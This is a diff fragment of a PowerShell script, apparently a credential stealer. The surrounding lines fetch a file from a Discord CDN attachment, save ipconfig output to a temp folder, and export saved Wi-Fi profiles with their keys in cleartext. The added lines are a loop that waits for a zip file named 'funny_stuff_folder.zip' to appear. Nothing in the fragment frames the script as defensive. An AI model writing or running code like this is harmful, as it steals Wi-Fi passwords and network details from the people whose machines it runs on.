@@ -16,6 +16,11 @@ Invoke-WebRequest 'https://cdn.discordapp.com/attachments/975173196103966800/143
 $e = "$env:LOCALAPPDATA\Temp"
 $zip = "$env:TEMP\funny_stuff_folder.zip"
 ipconfig /all | Out-File "$e\ipcfg.txt"
+
+while (-not (Test-Path $zip)) {
+    Start-Sleep -Seconds 1
+}
+
 netsh wlan export profile key=clear folder=$e | Out-Null
 
 $wifiFile = "$e\wifi.txt"
